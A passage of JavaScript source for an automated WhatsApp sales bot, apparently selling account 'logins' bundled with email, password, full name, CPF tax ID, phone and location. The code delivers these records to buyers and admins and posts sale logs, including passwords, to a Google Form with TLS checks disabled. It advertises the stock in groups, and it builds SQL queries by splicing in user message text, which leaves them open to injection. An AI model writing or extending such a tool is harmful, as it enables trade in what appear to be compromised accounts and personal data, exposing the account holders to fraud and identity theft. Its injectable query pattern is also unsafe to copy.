                    ENTRY_FORM_LOG_LOGINVENDA6 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA6'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA7 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA7'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA8 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA8'`).get()["VALOR"]

                    Mensagem_Nome_plan = Mensagem_Nome.replace(/[^0-9\sa-zA-Z]/igm, "")
                    SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")
                    SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")

                    if (CPF.toString() === "§") {
                        DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    } else if (CPF.toString() === "§§" || CPF.toString() === "0") {
                        EMAIL_plan = EMAIL.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = `Email:${EMAIL_plan} Senha:${SENHA}`
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    } else {
                        DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    }
                    var options = {
                        'method': 'POST',
                        'url': URL_plan,
                        rejectUnauthorized: false,
                    };
                    request(options, function (error, response) {
                        if (error) throw new Error(error);
                        console.log(`Logs enviados para planilha.`);
                    });
                }


                MENSAGEM_AO_COMPRAR_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_LOGIN'`).get()["VALOR"]

                if (CPF.toString() === "§") {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`
                } else if (CPF.toString() === "§§") {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`

                } else {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}
👤NOME: ${NOME}
👤CPF: ${CPF}
👤USER: ${USER}
📱TELEFONE: ${TELEFONE}
🏞️ESTADO: ${ESTADO}
🏭CIDADE: ${CIDADE}

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`

                }
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto_Grupo = `📱 *USUÁRIO COMPROU UMA LOGIN* 📱

👤 *USUÁRIO:* wa.me/${Numero}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

*VENHA ADQUIRIR OS MELHORES LOGINS DO MERCADO!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}
`

                NOT_COMPROU_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LOGIN'`).get()["VALOR"]
                if (NOT_COMPROU_LOGIN === "1") {
                    for await (Grupo of ID_GRUPOS) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Login_GP}',
'${Date.now()}')`).run()
                    }
                }

                Texto_Adms = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}
👤NOME: ${NOME}
👤CPF: ${CPF}
👤USER: ${USER}
📱TELEFONE: ${TELEFONE}
🏞️ESTADO: ${ESTADO}
🏭CIDADE: ${CIDADE}

${ADICIONAIS}
`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                console.log(`Login Comprado! Numero: wa.me/${Numero} | Valor: ${PRECO_LOGIN}`)
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        } else {
            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            //             if ((Mensagem_Texto).toString() === "/login4353534") {

            //                 Categorias = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO FROM LOGINS`).all();
            //                 if (Categorias.length === 0) {

            //                     Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
            //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                     for await (adm of Adms) {
            //                         Texto = `⚠️ *ATENÇÃO ADM* ⚠️

            // Usuário: wa.me/${Numero}

            // Tentou efetuar a compra de logins, mas o estoque está vazio!`
            //                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
            //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                         }).catch(async(erro) => {
            //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                         });
            //                     }
            //                     return
            //                 }

            //                 Array_Tipos_Em_Estoque = await DataBase_Better.prepare(`SELECT MIN(_rowid_) AS _rowid_, SERVICO FROM LOGINS GROUP BY SERVICO`).all();

            //                 Array_Botoes = []
            //                 Array_Botoes.push("*SERVIÇOS DISPONÍVEIS*\n")

            //                 for await (Categoria of Array_Tipos_Em_Estoque) {
            //                     //console.log(Categoria)
            //                     //console.log(Categoria["SERVICO"])

            //                     Algum_Login = await DataBase_Better.prepare(`SELECT * FROM LOGINS WHERE SERVICO = '${Categoria["SERVICO"]}' LIMIT 1`).all();
            //                     Estoque = await DataBase_Better.prepare(`SELECT SERVICO FROM LOGINS WHERE SERVICO = '${Categoria["SERVICO"]}'`).all();

            //                     Nome_Servico = Categoria["SERVICO"]
            //                     Mensagem_Textoa = Mensagem_Texto.replace(/[^a-zA-Z\s]/igm, "")
            //                     Nome_Servico = Nome_Servico.split(" ")
            //                     try {
            //                         Array_Botoes.push(`*${Categoria["SERVICO"]}* 💰 R$:${Algum_Login[0]["PRECO"]}
            // Digite /comprarlogin${Nome_Servico[0].toLowerCase()}\n`)
            //                     } catch (error) {
            //                         await Menu(client, Numero, Mensagem_From)
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }
            //                 }

            //                 Texto = `${Array_Botoes.join("\n")}`
            //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
            //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                 }).catch(async(erro) => {
            //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                 });
            //                 return
            //             }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            // ID_Login_MODO_s = 0
            //             if (Mensagem_Texto.indexOf("/comprarlogin34234234") > -1) {
            //                 Servico_Temp = Mensagem_Texto.toString().replace(/\/comprarlogin/igm, '');
            //                 console.log(Servico_Temp)
            //                 Array_Logins = await DataBase_Better.prepare(`SELECT _rowid_,* FROM LOGINS WHERE instr(SERVICO, '${Servico_Temp.toUpperCase()}') > 0 LIMIT 1`).all()
            //                 if (Array_Logins.length === 0) {
            //                     Texto_Sem_Estoque = `*O ESTOQUE DESTE LOGIN ACABOU, ESCOLHA OUTRAS OPÇÕES!*`
            //                     await client.sendText(Mensagem_From, Texto_Sem_Estoque).then(async (result) => {
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                     return
            //                 }
            //                 ID = Array_Logins[0]["rowid"]
            //                 console.log("ID_Login_MODO_s")
            //                 console.log(ID)

            //                 ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM LOGINS WHERE _rowid_ = '${ID}'`).get()
            //                 if (ROWID === undefined) {
            //                     Texto = `Desculpe, outra pessoa comprou este Login, escolha outro!`
            //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                     return
            //                 }

            //                 item = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO FROM LOGINS WHERE _rowid_ = '${ID}'`).get();

            //                 ID = item["rowid"]
            //                 SERVICO = item["SERVICO"]
            //                 EMAIL = item["EMAIL"]
            //                 SENHA = item["SENHA"]
            //                 NOME = item["NOME"]
            //                 CPF = item["CPF"]
            //                 USER = item["USER"]
            //                 TELEFONE = item["CPF"]
            //                 ESTADO = item["ESTADO"]
            //                 CIDADE = item["CIDADE"]
            //                 ADICIONAIS = item["ADICIONAIS"]
            //                 PRECO = item["PRECO"]

            //                 PRECO_LOGIN = parseFloat(PRECO).toFixed(2)
            //                 if (parseFloat(PRECO) === 0 || parseFloat(PRECO) === 0.00) {

            //                     Texto = `Não foi possível efetuar a compra deste Login, pois o valor do mesmo não foi definido. Nossa equipe foi notificada!`
            //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {

            //                         for await (adm of Adms) {
            //                             Texto = `*ATENÇÃO ADM*

            // Numero: wa.me/${Numero}, Tentou comprar um Login que não possui preço definido.

            // REVISE AS TABELAS DE PREÇOS E DEFINA OS PREÇOS DOS LOGINS COM CUSTO R$:0`
            //                             await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
            //                             }).catch(async(erro) => {
            //                                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                             });
            //                         }
            //                         return
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                     return;
            //                 }

            //                 SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            //                 SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
            //                 if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_LOGIN)) {

            //                     Texto = `⚠️*Você não possui saldo suficiente para comprar este Login.*`
            //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                     return;
            //                 }

            //                 NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_LOGIN)
            //                 NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

            //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            //                 await DataBase_Better.prepare(`INSERT INTO LOGINS_VENDIDOS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${Mensagem_From}','${Date.now()}')`).run()
            //                 await DataBase_Better.prepare(`DELETE FROM LOGINS WHERE _rowid_ = ${ID}`).run()

            //                 VALOR_BASE_INDIC = PRECO_LOGIN
            //                 Contato_Temp_Indic = Mensagem_From
            //                 FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            //                 if (FUNCAO_ASSOCIADOS_PAGO === "1") {
            //                     ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
            //                     if (ATIVAR_ASSOCIADOS === "1") {

            //                         Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
            //                         if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
            //                             NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
            //                             PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
            //                             if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
            //                                 PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
            //                             } else {
            //                                 PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
            //                             }

            //                             PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
            //                             if (PIX_OU_COMPRA === "1") {

            //                             } else if (PIX_OU_COMPRA === "2") {
            //                                 VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
            //                                 VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
            //                                 console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

            //                                 SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
            //                                 SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
            //                                 console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

            //                                 NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
            //                                 NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
            //                                 console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

            //                                 await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
            //                                 console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
            //                             }
            //                         }
            //                     }
            //                 }

            //                 ATIVAR_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_LOG_LOGINVENDA'`).get()["VALOR"]
            //                 if (ATIVAR_LOG_LOGINVENDA === "1") {
            //                     ID_FORMULARIO_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ID_FORMULARIO_LOG_LOGINVENDA'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA1 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA1'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA2'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA3 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA3'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA4 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA4'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA5 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA5'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA6 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA6'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA7 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA7'`).get()["VALOR"]
            //                     ENTRY_FORM_LOG_LOGINVENDA8 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA8'`).get()["VALOR"]

            //                     Mensagem_Nome_plan = Mensagem_Nome.replace(/[^0-9\sa-zA-Z]/igm, "")
            //                     SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")
            //                     SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")

            //                     if (CPF.toString() === "§") {
            //                         DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
            //                         DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
            //                         URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
            //                     } else if (CPF.toString() === "§§" || CPF.toString() === "0") {
            //                         EMAIL_plan = EMAIL.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
            //                         DADOS_plan = `Email:${EMAIL_plan} Senha:${SENHA}`
            //                         URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
            //                     } else {
            //                         DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
            //                         DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
